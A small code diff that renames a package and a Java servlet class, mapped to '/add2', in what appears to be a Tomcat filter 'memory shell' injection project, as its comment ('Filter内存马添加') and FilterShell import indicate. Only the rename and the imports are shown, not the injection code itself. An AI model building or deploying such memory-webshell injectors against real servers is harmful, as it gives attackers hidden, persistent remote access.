@@ -1,4 +1,4 @@
-package cn.safe6.servlet;
+package cn.safe6.action;
 
 import cn.safe6.filter.FilterShell;
 import org.apache.catalina.Container;
@@ -29,7 +29,7 @@ import java.util.Map;
  * Filter内存马添加
  */
 @WebServlet("/add2")
-public class AddShellServlet2 extends HttpServlet {
+public class AddShellFilter extends HttpServlet {
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
